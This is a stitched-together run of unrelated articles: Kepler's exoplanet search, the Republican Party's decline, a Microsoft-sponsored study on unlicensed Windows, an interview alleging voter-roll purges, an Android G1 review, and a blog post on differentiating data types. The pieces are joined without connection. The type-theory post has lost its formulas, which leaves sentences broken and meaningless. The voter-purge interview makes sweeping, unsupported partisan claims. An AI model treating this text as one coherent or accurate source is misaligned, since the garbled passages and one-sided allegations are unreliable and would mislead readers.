“ There was no effect , ” he says .
“ It was pretty much ignored . ”
At that time most researchers thought the way to look for other planets was through astrometry .
Borucki was convinced that looking for planetary transits through photometry would be simpler and cheaper .
Measuring the brightness of a star over time , he reasoned , would require a much smaller space telescope than trying to take a picture sharp enough to resolve a planet or a tiny loop in the star ’s trajectory .
Borucki ’s peers were skeptical , though — first , that a transit of an Earth would even be distinguishable against the background noise of the star ’s fluctuating light , and second , that it was possible to monitor 5,000 sunlike stars at once , as he proposed to do .
Research on the sun during the 1980s laid the first objection to rest ; starlight turned out to be a lot less noisy than astronomers had thought .
Over periods of days , which is how long it would take an Earth to pass in front of it , the sun ’s output varies by only around 10 parts per million , whereas the passage of an Earth would dim it by 84 parts per million .
So such a transit was in principle detectable , but Borucki ’s initial idea for a detector still raised eyebrows .
He wanted to drill 5,000 holes , one for each star , into a metal template and put it near the focal plane of the telescope , with an individual photodiode and integrated circuit behind each hole .
“ People in the industry refused to even talk to us about that design , ” recalls David Koch , the deputy principal investigator , whom Borucki roped in to his quest in 1992 .
Borucki ’s basic concept was rescued by the emergence of the charge - coupled device , or CCD — the light - sensing chip that was then new and is now in hundreds of millions of digital cameras .
A CCD can record the brightness of many stars at once , thus eliminating the need for thousands of photodiodes .
Borucki and Koch first proposed their mission to NASA in 1994 ; they called it FRESIP , for “ Frequency of Earth - Size Inner Planets . ”
They proposed it again in 1996 , 1998 , and 2000 .
“ Each time they came back with a list of reasons why we were n’t selected , ” Koch says .
“ It wo n’t work because of this , it wo n’t work because of that , they said .
And we went back and worked on it until we eliminated every reason they could n’t select us . ”
The researchers made sure , for instance , that the minute vibrations of the spinning gyroscopes that kept the telescope pointed at its target would not drown out the signal from a planet .
The name of the spacecraft was an easier sell .
After the first proposal , Koch suggested naming it Kepler , after the discoverer of the laws of planetary motion .
In 2001 NASA finally approved the mission .
Over in Europe Corot was getting the go - ahead at around the same time , albeit at a much lower budget .
Though the French won the race into orbit , Kepler will have a telescope measuring 95 centimeters ( 37.4 inches ) , 3.5 times the diameter of Corot ’s , with a field of view more than 10 times as large .
Above all , it will be in orbit around the sun , trailing behind Earth , whereas Corot is in low Earth orbit over the poles .
To avoid looking too close either to the sun or to Earth , Corot has to turn 180 degrees twice a year , which is why it ca n’t look longer than five months at one set of stars .
As it orbits the sun , Kepler will stare at the same spot for its entire mission — which will allow it to detect true Earth analogues , those circling stars like the sun in orbits lasting about a year .
“ The French will find the first terrestrial - size planet , ” Borucki predicts .
“ But those planets wo n’t be in the habitable zone .
We ’ll find the first one in the habitable zone . ”
Actually , he expects to find several hundred .
Kepler ’s field of view covers 100 square degrees , around 0.25 percent of the sky , or as Koch puts it , “ about two scoops of the Big Dipper . ”
Koch chose the most star - rich patch he could find in the U.S. Naval Observatory star catalog .
It lies just out of the plane of the Milky Way , between the bright stars Vega and Deneb .
Of the 13 million stars cataloged in that field of view , Kepler will monitor a subset that are most like the sun in size , mass , and age — stars that are quiet and sedate like our own .
Its 42 CCD detectors lie just outside the telescope ’s focus .
“ You do n’t have to have a sharp image , ” Borucki explains .
“ In fact , a fuzzy image is better ” — the starlight is spread over more pixels , which keeps them from saturating as quickly .
Because it has CCDs , Kepler will be able to monitor 100,000 stars simultaneously .
It will spot variations as small as 10 parts per million in their light output .
When Kepler lifts off from Cape Canaveral on April 10 , Borucki will have spent 17 years on his idea .
“ You do n’t spend this long and then quit 90 percent of the way through , ” he says .
“ I want to see the answers .
I want to hold the data in my hand .
I want to write the paper that says , ‘ This is how many Earths there are . ’”
He may find none — which would be the most surprising result of all .
Neither Borucki nor anyone in the planet - hunting business expects or wants that .
It would mean Earths are extremely rare at best .
It would mean we really might be alone in the galaxy , if not the universe .
By the time Kepler reports its first results , the exoplanet landscape will no doubt have changed yet again .
Astronomers all over the world are hunting a second Earth .
In May , Drake Deming of NASA was collecting data he hoped might reveal a super - Earth in the habitable zone of a red dwarf ( a small and relatively cool star ) called Gliese 436 ; NASA had allowed him to use a spacecraft called Epoxi , which is on its way to a rendezvous with a comet , to observe several stars that are already known to have planets .
Also , last May Debra Fischer of San Francisco State University began training a small telescope in Chile on Alpha Centauri , a pair of sunlike stars that are the closest ones to Earth .
Following up on an idea of Greg Laughlin ’s , she believes that by observing it steadily for several years , she might detect not only an Earth but a Mercury and a Venus as well .
“ That ’s what we ’re going for — not just the first Earth but the first terrestrial planetary system , ” she says .
“ It ’s a pretty bold and crazy plan . ”
Although Kepler and Corot are focusing on sunlike stars that could support true analogues of Earth , much of the action at ground - based telescopes is concentrating on red dwarf stars , for the simple reason that planets are easier to find there .
An Earth - like planet would cause a bigger wobble and a darker transit in a red dwarf than in a sun , and the effect would be even more pronounced if the planet were in the habitable zone — because the habitable zone , where liquid water can exist , lies closer to a cool red dwarf .
In the fall of 2007 David Charbonneau of Harvard began deploying a network of small telescopes in Arizona that will be focused on detecting transiting super - Earths in the habitable zones of red dwarf stars .
The Swiss and California teams think they can do the same with the wobble technique .
Of the super - Earths they ’ve discovered so far , some — including the one around Gliese 876 — orbit red dwarfs , though none lie in the habitable zone .
No one knows for sure whether a rocky planet in a red dwarf ’s habitable zone would truly be habitable .
Until recently , in fact , astronomers assumed it would n’t be .
A planet so close to a star might have been blasted and sterilized , early in its existence , by flares from the star .
It might be gravitationally locked , with one face always pointing toward the star , the way the moon always points the same face toward Earth .
In that case the whole atmosphere might have frozen and snowed out on the dark side , leaving the planet airless and barren .
But after having some of their preconceptions shattered by the discovery of Jupiter - size planets orbiting their stars in less than two days , planet hunters are no longer so confident of the others .
Life might emerge on a red dwarf planet , some now think , after the star has aged and its flares have settled down ; winds on the planet might transport heat from one hemisphere to the other , keeping the atmosphere from freezing .
After a workshop on red dwarfs in 2005 , Jill Tarter of the SETI Institute — a leading thinker on alien life — and her colleagues published an analysis that convinced many researchers that red dwarfs are worthy targets for Earth hunters .
That ’s a happy conclusion , given that red dwarfs are the most common stars in the galaxy and also the easiest targets for ground - based telescopes .
But even if a habitable Earth - like world is found first from the ground , it will most likely take a space observatory to search for the chemical signals that tell us what we really want to know :
Is anything living out there ?
If the planet is one that can be observed transiting , it just might be possible to provide a hint of an answer in the next few years .
As a transiting planet passes in front of its star , some starlight passes through the planet ’s atmosphere and continues on toward Earth — minus certain spectral frequencies that have been absorbed by molecules in the atmosphere .
In 2001 , using Hubble , Charbonneau and his colleagues detected the first exoplanetary atmosphere that way ; it belonged to a hot Jupiter called HD 209458 b , and it contained sodium , they said .
Three years later Charbonneau found himself locked in a race with Deming to be the first to detect the flip side of a planetary transit — the moment , called secondary eclipse , when a planet passes behind its star .
This time it was Deming who was observing HD 209458 b , with the Spitzer Space Telescope , an orbiting infrared observatory .
Charbonneau , he knew , had collected data on a different hot Jupiter a month earlier .
“ We did n’t want to be second , ” Deming recalls .
“ I was analyzing data while I was eating Christmas dinner .
I had to catch Dave . ”
In the end they published papers simultaneously and held a joint press conference .
What each had done for the first time was detect an exoplanet ’s photons .
No telescope yet can spatially distinguish an exoplanet from its star ; the distance between them is too small and the brightness contrast too large .
A Jupiter adds about a billionth to the visible light of a sunlike star , and about a ten - thousandth to the star ’s infrared glow ( planets give off more heat than they do reflected starlight ) .
By observing the combined infrared radiation of star and planet with Spitzer and then subtracting the radiation recorded from the star alone when it hid the planet , Deming and Charbonneau had detected the heat of the planet itself .
From that they could calculate its temperature ; Charbonneau ’s team has since been able to create a crude weather map of their exoplanet , HD 189733 b , which showed that fierce winds must be spreading heat around its surface .
Others using the secondary eclipse technique have detected evidence for water vapor and methane in the atmosphere of HD 189733 b.
These findings are trials for the far tougher task of picking apart the light of an Earth - like planet , much smaller and farther from its star ( and thus far dimmer ) than the hot Jupiters studied to date .
Spitzer was n’t designed to measure the spectrum of hot Jupiters , but it did .
And the James Webb Space Telescope , which is slated to replace Spitzer in 2013 , has not been designed to detect the spectrum of Earth - like exoplanets — but with its 6.5 - meter ( 21.3 - foot ) mirror , nearly eight times the diameter of Spitzer ’s , Deming and Charbonneau think it might .
Other astronomers are more cautious .
“ I certainly would n’t claim JWST is going to prove habitability , because it ’s not , ” says Mark Clampin , project scientist for the observatory .
Sara Seager of MIT , who collaborates with Deming , is trying to figure out which spectral signatures in a planet ’s atmosphere would provide the best evidence for signs of life .
Water vapor is indicative of liquid surface water , which is necessary but not sufficient for life as we know it .
Oxygen , which would quickly react out of Earth ’s atmosphere if it were n’t continually produced by plants , is closer to a smoking gun , especially if it were seen together with methane .
Then there is what Seager has dubbed “ vegetation ’s red edge ” :
At wavelengths of 700 to 750 nanometers , at the red end of the visible range , the reflectance of leafy green plants sharply increases , to four or five times what it is even at green wavelengths .
Whether the Webb can detect such a signature is not yet known , and even if it can , the data probably wo n’t be definitive .
Deming and Charbonneau ’s secondary eclipse technique , ingenious as it is , lacks the power to distinguish between life and something else .
Making that distinction will require a new kind of space telescope .
That ’s where Corot and especially Kepler come in .
They wo n’t provide targets for that future space telescope , unfortunately .
To monitor many stars and maximize its chances of finding Earths , Kepler is forced to monitor distant ones ; any Earths it finds will most likely be about 300 light - years away , too far for any currently imaginable space telescopes to take a spectrum from .
What Kepler will do is tell astronomers — and NASA and ESA — what sort of space telescope it will take .
If nearly every sunlike star has an Earth , we might find life around a relatively nearby star , with a relatively small telescope .
If Earths are rare , the next telescope will have to be big .
Eventually such a telescope will get built — and if the pace of discovery remains as rapid as it is now , that day will come sooner rather than later .
Finding convincing evidence for extraterrestrial life may take decades , but that is not a long time given the stakes .
“ Throughout recorded history we ’ve had this question : Are we alone ? ”
Tarter says .
“ For millennia , all we could do was ask the philosophers .
Suddenly we have a way of looking for an answer that is not based on a belief system .
I live in the first generation of humans that is able to do that .
I think that ’s extremely exciting . ”
Other astronomers too feel acutely the historic nature of their quest .
One of the last things to be mounted on Kepler this fall , before it makes the journey to Canaveral for the launch , will be a metal plaque engraved with the names of all 2,000 scientists , engineers , and managers who contributed to its mission , which will run through 2012 .
Kepler will follow a 53 - week orbit around the sun , meaning that it will steadily drift farther behind Earth .
“ It loses a week a year , ” Borucki says .
“ So 53 years after launch , it will come back to Earth .
At that point , I expect , people will go up and pick up the spacecraft and put it in the Smithsonian .
I know that sounds far - fetched .
But I really think it will happen . ”
The GOP is more unpopular , more insecure and more uncertain than at any point since the triumph of 1994 .
Why the GOP fell so far , so fast
The Grand Old Party just ai n’t what it used to be .
It is more unpopular , more insecure and more uncertain than at any point since the euphoric triumph of 1994 , when the GOP captured both houses of Congress and made political history .

It would be easy to chalk up the current doldrums to an unpopular president who waged an unpopular war — and Republicans surely wish it were that easy .
Unfortunately for GOP leadership and the rank and file , the problems run much deeper and could prove more durable .
The GOP is a shell of what it was a decade ago .
The party has allowed its infrastructure — think tanks , candidate training programs and activist groups — to atrophy .
It lost its decisive fundraising edge .
It has been slow to exploit technological advances .
And it has struggled to carve out a post - Sept. 11 identity beyond an image of the party best equipped to fight terrorism .
That depressing litany is the general consensus of many of the Republican officials who were once on top : the governors , congressional leaders and big - time activists who ruled in the 1990s with self - confidence and swat .
( On Monday , Politico ’s Fred Barbash will explore what today ’s leading GOP lights think it will take to turn things around in the years ahead . )
Republican can take some solace in the fluidity of modern politics .
( Remember , it was only a few years ago that we “ smart ” political reporters were writing about the possibility of a GOP governing majority that might last for decades . )
The combination of an unsettled electorate , technology and a fast - changing world make it possible to turn things around in a hurry — as Democrats have proven over the past six years or so .
They used a huge influx of money from big liberal donors to rebuild their think tanks , turn the Web into a fundraising gold mine and attack machine , and start new training centers for young party activists .
Crumbling Infrastructure
It was not long ago that Republicans were the machine to be admired .
They were cranking out ideas , money and activists — all on the backs of hungry conservatives with fresh memories of life in the political no man ’s land .
Republicans outthought and outhustled Democrats for much of the 10 - year period that began in 1994 — or so it seemed .
In retrospect , some Republicans say there were signs that the fire in the belly was starting to cool as early the winter of 1995 , when they buckled in the government shutdown showdown with President Bill Clinton .
“ They went eyeball to eyeball with Clinton and lost , ” said Richard Viguerie , an influential conservative activist .
That was the moment , he said , that the GOP started to lose its edge .
Of course , Republicans continued to roll up big policy wins — tax cuts and welfare reform , to name two — but a pattern emerged throughout the 1990s .
GOP officials , reckoning with the realities of governing , compromised to get their way .
They realized “ you could use the levers of powers to secure your majority , ” says Michael Franc , a former top GOP leadership aide and now a top official at the Heritage Foundation .
Each time important principles turned into watered - down policy , the conservative faithful grew more exasperated .
And it was the party infrastructure that started to suffer .
Programs such as GOPAC ( for candidates ) and American Campaign Academy ( for campaign managers and operatives ) were neglected .
These programs had once “ created a cadre of hundreds of people who knew how to do campaigns , ” says Joe Gaylord , a former top adviser to House Speaker Newt Gingrich ( R - Ga . ) .
“ That stopped in the ’90s . ”
Just as importantly , conservative activist groups weakened .
The Christian Coalition , a major force in GOP politics in the early 1990s , splintered and eventually , for all practical purposes , faded away .
The group spent approximately $ 6 million to pressure lawmakers in 1998 ; three years later , it was spending less than one - third that amount .
“ It became increasingly difficult to activate the rank and file as they saw the Republicans becoming like their Democratic predecessors , ” says Richard Land , the president of the Southern Baptist Convention ’s Ethics and Religious Liberty Commission .
“ I ’m not the only one who got awfully tired when they went into negotiations .
It was our issues that got bargained away . ”
Many in the evangelical movement grew dispirited — and today this group is without a clear leader and without a clear organization for collectively harnessing its political muscle .
The National Rifle Association lost some of its firepower , too .
Not long ago , the group could literally tilt close elections with its massive membership list and political action committee .
But in recent years , Democrats in pro-gun areas have embraced the NRA and many pro-gun initiatives .
Put bluntly , the NRA does not matter as much as it once did — and that hurts the GOP .
In 2000 , the group gave nearly $ 3 million to the party .
It gave less than $ 1 million in 2004 and appears on a similar pace this time around .
The story is the same for many of the conservative think tanks and outside groups that towered a decade ago .
They now seem to pump out fewer policy innovations , especially given that when Bush was elected , the GOP held all the real levers of power by controlling the presidency and Congress .
“ You take a look at the first four years when the president had both the House [ and the ] Senate , ” says former Pennsylvania Gov. Tom Ridge .
“ There were very few new ideas emerging that embraced historic Republican principles . ”
This policy stagnation extended to the states , which were once the real laboratories for innovation , according to Ridge .
It will take time — and inspired leadership — to restore these groups or erect new ones .
There are few signs this is taking place right now .
Fundraising Funk
It is hard to overstate how radically things have changed for Republicans when it comes to raising money .
In their glory years , they were very good at using direct mail to raise small - dollar donations and even better at working with their rich corporate allies to scare up money for political activities both inside and outside the federally regulated system .
It was a given they would crush Democrats in fundraising for congressional races — and more than hold their own in presidential contests .
They were the innovators , whether it was rewarding big donors with better access to party leaders or setting up programs to reward and offer incentives to their most prolific fundraisers .
From the 1994 election cycle through the 2002 cycle , Republican Party committees raised approximately $ 1.85 billion , compared with $ 1 billion raised by Democratic Party committees — an 85 percent advantage for the GOP .
But two things changed that have hurt the GOP badly in this fundraising arena .
First , the low - dollar donors , mostly conservative activists , turned cool to the party leadership in Washington .
In the 2000 election cycle , Republican House candidates raised 16 percent of their campaign cash in donations of $ 200 or less , according to the Campaign Finance Institute .
By 2006 that share had dropped to 8 percent .
In the Senate , the decline was even steeper , with low - dollar donations going from a 41 percent share of campaign cash in 2000 to 15 percent in 2006 .
The second factor can be blamed — at least in part — on John McCain .
His campaign finance reform push resulted in the end of those big , unlimited soft money donations to the party .
At the time , it was assumed that money would simply be channeled through outside groups that are subjected to less disclosure .
That never really materialized because many corporate donors are risk averse .
Democrats , it turned out , were much more willing to fund these outside groups — and in 2004 easily outspent the GOP .
According to the tracking service now known as CQ Money Line , outside groups aligned with Massachusetts Sen. John F. Kerry outspent those aligned with President Bush by $ 266 million to $ 144 million .
Money is n’t everything in politics — but it sure does help .
Technology Glitches
One of the biggest reasons that it may take years for Republicans to steady their ship is that they have fallen way behind Democrats when it comes to exploiting new technologies to raise cash , especially online .
It is the Democrats who now are the innovators in this area .
First Howard Dean and now Barack Obama have built massive programs for raising money , usually in small chunks , online .
They have bigger e-mail lists and many times more donors familiar with sending money over the Web .
They also have generally shown more sophistication in their online approach .
ActBlue , a Web hub for Democratic fundraising , has directed more than $ 60 million to candidates since 2004 .
Republicans do n’t even have an equivalent .
The technology gap transcends fundraising , however .
Democrats , in general , are embracing the Web more eagerly as a way to communicate — and gather — information .
Daily Kos , a popular stop for Democratic officials and activists , has registered more than 1 billion page views in six years .
Redstate.com , a similar kind of Web community for Republicans , has recorded fewer than 50 million .
Republicans often seem kind of retro .
Talk radio remains a more powerful communications device for conservatives , with Rush Limbaugh maintaining a weekly audience of as many as 20 million .
But the talk radio audience has slowed in growth over the past 15 years , and no one thinks it will be the dominant medium of the future .
The Sept. 11 Deficit
It was n’t long ago that the conventional wisdom was that tragic events of Sept. 11 , 2001 , represented a golden political opportunity for Republicans to lock in a durable governing majority .
The thinking seemed smart at the time :
The GOP , with its tough - guy image on national security , would capitalize on pervasive voter fear to pummel soft - on - security Democrats .
The 2002 congressional elections seemed to validate this theory .
Republicans campaigned on security — and picked up seats in the process .
They did it again in 2004 — and Bush won .
But leading Republicans said that the power of the anti-terrorism message lulled the idea - generators of the party to sleep .
“ After that had run its course , the gas tank was empty , ” says Gaylord .
Lost in the hoopla over terrorism in war was the GOP ’s unmistakable — and now , many in the party say misguided — march toward big - government conservatism .
The terrorist attacks happened , “ and all the attention moved to the federal level , ” says former Oklahoma Gov. Frank Keating .
“ It became much more of a Washington - knows - best environment . ”
Republicans created a new federal department and a new entitlement program , and they drove up the federal deficit .
The spending spree blurred their long - term edge with voters in holding down spending and has made it virtually impossible for them to advocate big tax cuts now because of the huge deficit .
This might not have mattered if the Iraq war were a success .
But it has not been , especially when viewed as a political proposition .
Voters are opposed to the war .
And the mismanagement of the initial invasion , reconstruction and the political process in Baghdad has eroded the GOP ’s advantage on broader national security matters .
Polls show that voters still trust the GOP more to fight terrorism .
But there is no doubt that the execution of the post - Sept. 11 strategy has raised serious doubts about GOP competence .
The response to Hurricane Katrina in 2005 did n’t help much either .
It takes time to change perceptions like these .
Scandalous Hubris
It ’s also hard to rebuild a brand when your pitchmen are wearing stripes .
Sure , most Republican scandals have not resulted in jail time .
But there has been an astonishingly large number of humiliating sex , money and influence sagas over the past few years .
Sen .
Larry Craig allegedly flirting in the men ’s room ; Sen .
Ted Stevens allegedly hiding $ 250,000 in gifts from an oil company ; Sen .
David Vitter ’s name ending up on a hooker ’s phone list ; former Rep. Randy “ Duke ” Cunningham sitting on a yacht paid for with bribe money ; former Rep. Bob Ney serving time in prison .
It ’s enough to make any Republican blush .
Or leave the party .
The nonpartisan Pew Research Center has reported a big drop in the number of people who consider themselves Republicans .
In 2002 , the country was split evenly , based on Pew data .
Five years later , Democrats held a 15 - point edge .
In 2006 , this disparity cost the GOP more than voters .
Republicans lost 30 House seats , many in districts in which ethics and scandal were top issues .
They suffered down - ballot losses , too .
This might prove to be the easiest problem of all to fix — most of the obvious bad apples have fallen .

Companies that rely on unlicensed copies of Windows are more likely to experience system failures and lose customer data , Microsoft Corp. said Tuesday , citing a company - sponsored report .
According to the research , which was conducted by the Harrison Group Inc. but paid for by Microsoft , mid-sized firms -- those with more than 24 PCs and fewer than 500 -- were 43 % more likely to have had a critical system failure lasting more then 24 hours if they used unlicensed Windows .
Those businesses were also 28 % more likely to lose customer data and 73 % more likely to lose their own data than firms exclusively using licensed copies of Microsoft 's software .
The Harrison Group reached those conclusions after interviewing IT professionals and businesspeople at nearly 1,600 companies in the U.S. , the U.K. , China and Brazil .
Of the companies included in the survey , Harrison Group labeled 690 , or 43.7 % , as using fully - licensed software ; 890 , or 56.3 % , ran some unlicensed software .
Microsoft used the report to defend Windows Genuine Advantage ( WGA ) , its anti-piracy program that at times has come under fire from users .
In an entry to the company 's WGA blog Tuesday , Alex Kochis , a Microsoft senior product manager , trumpeted the results .
" Not surprisingly , companies that have more counterfeit software in their environment tend to have more IT related problems , " Kochis said .
Michael Cherry , an analyst with Directions on Microsoft , agreed with Kochis , up to a point .
" In principal , I kind of get the point that they 're making , " Cherry said .
" If you 're using non-genuine [ Windows ] , there 's a high likelihood that whoever put it on the media slipped other things into the code Actually , I would be surprised if there was n't something slipped in .
So I have no problems with that premise . "
But Cherry remained cautious of the report .
" I 'm nervous about this because Microsoft paid for it , " he said .
" But who else , really , would study this ? "
This is not the first time that Microsoft has linked unlicensed copies of Windows to negative side effects , including the potential of pirated copies containing malware , either by design or through an oversight on the part of the counterfeiter .
Even so , Microsoft has continued to tweak WGA .
Last month , for example , it announced an update for Windows XP Professional users that will make the non-genuine nagging more prominent .
The full Harrison Group report can be obtained from Microsoft 's site ( download PDF ) .

Votes are being stolen , now , by hundreds of thousands -- and the Democrats are n't doing anything about it .
RFK , Jr .
Robert F. Kennedy , Jr. :
There are about 30 scams the Republicans are deliberately using , particularly in the swing states to get Democratic voters off the rolls .
These scams originate in the so - called Help America Vote Act , which was passed after the Florida debacle in the year 2000 .
It was originally suggested by Democrats and Republicans , but it was passed by a Republican Congress with a Republican senate and a Republican president .
And instead of reforming what happened in Florida it basically institutionalized all the problems that happened in Florida .
And institutionalized a series of impediments that make it very difficult for Democrats to register , for Democrats to vote and then for Democrats to have their votes counted .
One of these requirements under HAVA is called ' the perfect match , ' and what that does is little known but it is devastating .
A quarter of the voters in Colorado have just been removed from the rolls because of this --[ and ] just this one scam .
And what it does is , they use a computer system to compare your registration application to all [ your ] other government records in the state .
So they 'll look at your Social Security records , your Motor Vehicle records , and any time you 've had any interaction with the government , and if there is any information on your voter registration that is different than the information on another government record that they find , they remove you from the voting rolls .
For example , if I registered as Robert F. Kennedy Jr. , and yet my motor vehicle license said Robert Frances Kennedy Jr. , I 'd be removed from the rolls .
If your initial is different , if you leave an initial out , if you leave a " Jr. " out , if you leave a hyphen out in your name .
And what they 've done is a study in New York that said 80 % of the errors are errors by state clerks taking down this information .
And particularly [ in ] immigrant communities , [ where ] people tend to vote Democratic , people have names Šspell Muhammad with an " o " instead of a " u "
( Crosstalk )
Papantonio : Are the Democrats suing to stop this ?
RFK , Jr. : No , the Democrats are doing nothing to stop it .
In New Jersey , which is a swing state , 300,000 voters in New Jersey were just sent letters saying that they are now ineligible to vote .
New Jersey is nice enough to actually notify them -- most states will not even notify them .
And New Jersey intends to send out 870,000 letters so that is three quarters of a million people off the voting rolls in a state that could decide this vote by 50,000 votes .
And these are Democrats that are being pushed off the rolls .
Let me tell you about one of other scams people should know about .
If you 're a newly registered voter -- and of course the Democrats have done these gigantic registration drives - - 12 million people on registration -- if you 're a new voter , you MUST include your license or some other state I.D. when you come to vote .
What that means is that if you 're a college kid-- and college kids now , they 're sending in absentee ballots , they 're not going to the voting place , they do everything online or they do everything remotely .
They do n't dream of going to the precinct house voting on election day and waiting in a long line .
So if they send in the absentee ballot , and they do n't include a color copy of their [ driver 's ] license , their vote is going to be thrown into a trash can .
And none of these people know this , because you had to have to read the law in order to know it .
There is no notification [ of this requirement ] when you fill out your registration form , so all of those 12 million people that the Democrats have registered -- those ballots are going to be just thrown out .
Papantonio :
And if Democrats wo n't talk about this , how the hell 's anybody gonna know about it ?
I 'm involved with this kind of thing every day -- I did n't know that until you just told me .
The media is not talking about it .
How in the hell is somebody gonna find this out ?
It 's just incredible .
RFK , Jr. : Hopefully -- Obama is getting $ 66 million a month - - hopefully somebody in the Democratic organization is going to pay some attention to this before Election Day .

Google 's Android is as an open - source operating system meant to give smart phone manufacturers a powerful platform on which to base their phones .
It 's even been touted as a challenger to Apple 's iPhone OS .
But iPhone users have grown accustomed to thinking about phone hardware and software as part of a unified whole .
So the first Android - running smart phone bears the burden of representing Android to the world .
The Google - backed G1's user experience will be a function of the HTC hardware , the Google Android platform , and service provider ( T - Mobile ) combined .
How will the G1 ( introduced last month and scheduled for release later this month ) stack up next to the Apple gold standard ?
" Apple 's business is to be three steps ahead of everyone else .
Apple is still two steps ahead , " said Gene Munster , senior research analyst at investment bank Piper Jaffray , on the launch of the G1 .
The hardware
The philosophy of the G1 device is straightforward .
Begin with an iPhone - like touch screen - based smart phone , then add all the features that critics wish the iPhone had .
And knock US $ 20 off the 8GB iPhone 3 G's $ 199 price .
A trackball and flip - out QWERTY keyboard may appeal to business people used to typing on their BlackBerries .
A memory slot will let you swap microSD memory cards , and a removable battery means you can carry a spare .
And the G1's 3 - megapixel camera should be an improvement over the iPhone 's 2 - megapixel camera .
Of course , all these extra slots , keys , and buttons carry a cost .
At .62 inches thick and 5.6 ounces in weight , the G1 is more than 25 percent thicker and nearly 20 percent heavier than the iPhone 3G .
If you 're a fan of the iPhone 's sleek , single - button approach , you could find the G1 a tad chunky and inelegant .
The G1 , the first Android - based smart phone , has a lot to prove .
And then there are limitations .
The G1's touch screen does n't support multi-touch , and the unit 's accelerometer wo n't recognize that you want to use the screen in landscape mode unless you open the keyboard .
Also conspicuously absent from the G1 is a standard headset jack .
So if you want to listen to music or watch video , you 'll need a special headphone adapter to connect to its proprietary design .
( The original iPhone had a recessed headphone jack requiring an adapter for many third - party headphones ; Apple ditched that design in the iPhone 3G . )
Finally , the G1's memory slot will only support expansion up to a maximum of 8 GB not very impressive when you consider that the iPhone 3G ships with 8 GB standard for $ 199 , or 16GB for $ 299 .
( You can , of course , buy multiple expansion cards for a G1 . )
The service provider
Thankfully , T - Mobile has already backed off on a planned 1GB monthly data cap for G1 service .
This should let users take better advantage of the smart phone 's capabilities .
Unfortunately , when the G1 launches on October 22 , T - Mobile 's 3G network will only cover 22 markets in the U.S. , jumping to 27 in November .
In comparison , AT&T 's 3G network covers more than 275 markets , with up to 350 covered by year 's end .
( Like the iPhone , G1 users will have the option of using T - Mobile 's slower EDGE network , or existing Wi -Fi networks . )
The software platform
As you would expect from a Google - based smart phone , the G1 appears to do a very solid job integrating Google applications including Gmail , Google Talk , and most impressively , Maps .
Google Maps ' Street View , coupled with the G1's GPS capabilities , will actually pan the first - person perspective screen image as you pivot the phone , helping you orient yourself with photographic landmarks .
( It is rumored that the next update to the iPhone software will include Street View as well . )
Buyers may be surprised to discover that the G1 does not ship with an extensive library of pre-installed software or games .
It does come with a few neat apps such as ShopSavvy , which allows you to comparison - shop online by scanning product barcodes using the built - in camera .
Ecorio will help you track your carbon footprint , and , unlike iPhone apps , it can actually run in the background .
The Amazon MP3 store will let you browse millions of songs using the 3G network , but Wi-Fi is required to purchase and download music .
But do n't expect to be able to sync your G1 with iTunes .
In fact , do n't expect to sync your G1 with your desktop computer at all .
That could make life tough for Outlook users , and may scare away potential business users attracted by the device 's added keyboard .
New software will be available for download using the beta version of the Android Market , Google 's answer to Apple 's App Store .
But analyst Gene Munster warns that users could find the process of downloading and installing Android apps significantly less straightforward than they have come to expect based on experience with Apple 's App Store .
Developer perspective
Apple has come under fire by iPhone developers for restrictive nondisclosure requirements ( since lifted ) and arbitrariness when it comes to selecting which applications to include in its App Store .
Will frustrated developers jump eagerly to Google Android 's open - source approach ?
Carl Howe , enterprise research director for technology research and consulting firm Yankee Group , speculates that the opposite may be the case .
" From a developer 's point of view , [ Android 's ] openness is trumped by having a consistent platform , " said Howe .
" With the iPhone , there 's one screen size .
There 's one interface .
The SDK is designed to make it really easy to develop software .
But most importantly they have a way to monetize that software quickly . "
That said , Google Android 's open - source , free market approach means that canny developers could build in device functionality , like VoIP via wireless , that service providers might now wantand that Apple would never allow to see the light of day .
So why are handset providers so fond of Google Android ?
By opting for Google 's open OS , manufacturers save $ 2 to $ 10 per unit , said Howe .
" Android is for handset makers , and the iPhone is for users . "
The possibilities of Google Android 's open approach may be endless , but whether and when such possibilities are realized remains to be seen .
For the foreseeable future , Apple 's seamless user experience gives iPhone the clear edge .

He remains hopeful that someday soon AT&T coverage will come to the Green Mountain State and all the illicit iPhone users can finally come out of hiding . ]

This post is not only extremely late , its also a bit of a cop-out .
Last time I said I would write about derivatives of types .
This is a cop-out in the sense that its a bit more “ overview ” - ish than I would have liked , but I did not find a way around that without making the whole thing unacceptably long .
So think of this as a way to get a feel for what ’s going on , and if you want more details you can always look at the paper
Zippers again
We ’ll start with a simple binary tree :
data BTree = Leaf | BTree ( BTree , BTree )
Notice that this is a “ bare ” tree – only structure , no data .
But it will do for our purposes .
Now you ’ll remember that in a Zipper , we had a subtree which was the focus of attention , and a Path which represented “ everything else ” .
The Path itself was a series of steps , going one level down at a time .
It is this notion of “ step ” that we are going to capture i.e. how do you represent the “ context ” of an immediate subtree of this tree .
You can then do this multiple times to get the complete Path used in the zipper .
This should be clearer by refering to the BTree example .
The “ step ” type here is :
Bool * BTree
The Bool tells us whether we are in the left or the right branch , and the BTree is the other branch i.e. the one we did n’t take .
The Path essentially consists of a series of these steps , one for each level that we have descended .
Now lets be a little loose and write the definition for BTree as follows :
or
Here we are ignoring the data constructors , and just thinking about the types themselves .
And here ’s the trick :
Think of this as an algebraic expression , and differentiate it wrt ( which is now a variable in this expression ) as you would have in high school .
But Bool = True |
False or in our notation 1 + 1 .
This means that the “ derivative ” has given us exactly the step type we were looking for !
This was not just a lucky example .
McBride found that the rules of differentiation can be applied ( unchanged ) to types ( including rules for products , the chain rule etc. ) , and they always gave the “ correct ” step type .
That good ol ’
Leibniz should have anything to say about type theory is really a remarkable coincidence .
Or is it ?
Details , details
Now in the above section ( and too an extent in this entire post ) I ’ve glossed over some things which are worth going into .
For example , what sort of types can we differentiate ?
( “ regular ” types ) Functional types as well ?
( no ) .
What exactly does differentiation mean ?
The notation I am using to describe types also needs to be explicitly defined , we need to worry about variable capture , etc. etc .
I can not go into all that here , but hopefully the notation makes sense intuitively so I ’ll only deal with some of the details .
I had asked you to accept that a BTree could be defined as .
This is in fact incorrect , because does n’t make too much sense ( and in fact tempts me to solve the quadratic and conclude that or some such ! ) .
McBride defines such recursive types using a least fixed point
But then , why did I differentiate instead of ?
Here ’s why : Taking a derivative is more general than calculating a step type ( think about non-recursive types .
“ Step type ” is meaningless there , but you can still take a derivative ) .
What really does , is it punches a “ hole ” for an element in a container .
This gives us the “ context ” or the surroundings of that element – i.e. the hole tells us where this element “ fits ” into the larger type .
